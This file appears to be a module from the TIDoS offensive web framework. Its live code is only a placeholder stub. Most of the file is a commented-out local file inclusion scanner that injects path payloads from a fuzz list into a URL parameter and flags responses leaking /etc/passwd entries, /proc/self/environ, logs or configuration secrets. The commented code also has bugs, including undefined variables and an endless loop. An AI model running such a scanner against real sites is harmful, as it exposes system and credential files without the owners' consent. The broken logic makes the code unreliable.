#!/usr/bin/env python
from core.colors import color
def lfi(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# # -*- coding: utf-8 -*-

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #Author: @_tID
# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function
# import os
# import sys
# import requests
# import time
# sys.path.append('files/signature-db/')
# from re import search
# from core.Core.colors import *
# from lfierror_signatures import errorsig
# from random import choice
# from string import uppercase, lowercase
# from requests.packages.urllib3.exceptions import InsecureRequestWarning

# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# payloads = []

# gotcha = []
# loggy = []
# enviro = []
# fud = []
# generic = []
# cnfy = []

# def check0x00(web0x00, pay, gen_headers):

#     try:
#         hunt = 0x00
#         print(GR+' [*] Making the request...')
#         rq = requests.get(web0x00, headers=gen_headers, allow_redirects=False, verify=False, timeout=7)
#         c = rq.content
#         print(O+' [!] Analysing responses...')
#         time.sleep(0.7)

#         if rq.status_code == 200 or str(rq.status_code).startswith('2'):
#             # signatures forked from lfisuite
#             if ("[<a href='function.main'>function.main</a>" not in content
#                     and "[<a href='function.include'>function.include</a>" not in content
#                     and ("Failed opening" not in content and "for inclusion" not in content)
#                     and "failed to open stream:" not in content
#                     and "open_basedir restriction in effect" not in content
#                     and ("root:" in content or ("sbin" in content and "nologin" in content)
#                 or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or 'root:x:' in content
#                 or "PATH=" in content or "HTTP_ACCEPT_ENCODING=" in content or "HTTP_USER_AGENT" in content
#                 or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
#                 or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
#                 or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
#                 or 'daemon:x:' in content or 'bin:x:' in content or 'mail:x:' in content or 'user:x:' in content
#                 or ("error]" in content and "[client" in content and "log" in website)
#                 or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
#                 or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
#                     and "/proc/self/status" in website))):

#                 website = str(web0x00)
#                 print(G+" [+] "+O+web0x00+G+' seems Vulnerable!')
#                 print(W+color.BOLD+' [+] Content Received : ')
#                 print(W+rq.content)

#                 gotcha.append(website)

#                 if("log" in website):
#                     loggy.append(website)
#                 elif("/proc/self/environ" in website):
#                     enviro.append(website)
#                 elif("/proc/self/fd" in website):
#                     fud.append(website)
#                 elif(".cnf" in website or ".conf" in website or ".ini" in website):
#                     cnfy.append(website)
#                 else:
#                     generic.append(website)
#             else:
#                 print(R+" [-] "+str(website)+O+" does not seem vulnerable...")
#                 if len(rq.content) > 0:
#                     print(W+color.BOLD+' [+] Content Received : ')
#                     print(W+rq.content)
#         elif str(rq.status_code).startswith('3'):
#             print(R+" [-] Redirection Response Received..."+O+' ('+str(rq.status_code)+')')
#             if len(rq.content) > 0:
#                 print(W+color.BOLD+' [+] Content Received : ')
#                 print(W+rq.content)
#         else:
#             print(R+" [-] Response Received : "+O+str(rq.status_code))
#             if len(rq.content) > 0:
#                 print(W+color.BOLD+' [+] Content Received : ')
#                 print(W+rq.content)

#     except Exception as e:
#         print(R+' [-] Exception encountered!')
#         print(R+' [-] Error : '+str(e))

# def outto0x00(toPrint,stack):
#     print(" [+] %s: [%s]" %(toPrint,len(stack)))
#     print('')
#     print(O+' [*] Displaying paths obtained...\n')
#     for path in stack:
#         print(G+' [+] Path :> ' + str(path))
#     print("")

# def getFile0x00():

#     try:
#         print(GR+' [*] Importing filepath...')
#         print(O+' [#] Enter path to file (default: files/fuzz-db/lfi_paths.lst)...')
#         w = raw_input(O+' [#] Your input (Press Enter if default) :> '+C)
#         if w == '':
#             fi = 'files/fuzz-db/lfi_paths.lst'
#             print(GR+' [*] Importing payloads...')
#             with open(fi,'r') as q0:
#                 for q in q0:
#                     q = q.replace('\n','')
#                     payloads.append(q)
#         else:
#             while True:
#                 fi = w
#                 if os.path.exists(fi) == True:
#                     print(G+' [+] File '+fi+' found...')
#                     print(GR+' [*] Importing payloads...')
#                     with open(fi,'r') as q0:
#                         for q in q0:
#                             q = q.replace('\n','')
#                             payloads.append(q)

#     except IOError:
#         print(R+' [-] File path '+O+fi+R+' not found!')

# def lfi(web):

#     print(GR+' [*] Loading module...')
#     time.sleep(0.5)
#     print(R+'\n     =========================================')
#     print(R+'      L O C A L   F I L E   I N C L U S I O N')
#     print(R+'     =========================================\n')

#     print(GR+' [*] Initiating '+R+'Parameter Based Check...')
#     param = raw_input(O+' [#] Parameter Path (eg. /vuln/fetch.php?q=lmao) :> ')
#     if not param.startswith('/'):
#         param = '/' + param
#     getFile0x00()
#     print(GR+' [*] Setting headers...')
#     gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
#                       'Accept-Language':'en-US;',
#                       'Accept-Encoding': 'gzip, deflate',
#                       'Accept': 'text/php,application/xhtml+xml,application/xml;',
#                       'Connection':'close'}

#     print(O+' [!] Parsing Url...')
#     time.sleep(0.7)
#     web0 = web + param
#     web00 = web0.split('=')[0] + '='
#     try:
#         for pay in payloads:
#             print(GR+'\n [*] Setting parameters...')
#             web0x00 = web00 + pay
#             print(C+' [+] Using path : '+B+str(pay))
#             print(B+' [+] Url : '+GR+str(web0x00))
#             check0x00(web0x00, pay, gen_headers)

#         if gotcha:

#             print(G+"\n [+] Retrieved %s interesting paths...\n" % str(len(gotcha)))
#             time.sleep(0.5)

#             outto0x00("Logs",loggy)
#             outto0x00("/proc/self/environ",enviro)
#             outto0x00("/proc/self/fd",fud)
#             outto0x00("Configuration", cnfy)
#             outto0x00("Generic",generic)

#         else:
#             print(R+' [-] No vulnerable paths found!')

#     except Exception as e:
#         print(R+' [-] Unexpected Exception Encountered!')
#         print(R+' [-] Exception : '+str(e))

#     print(G+'\n [+] LFi Module Completed!')
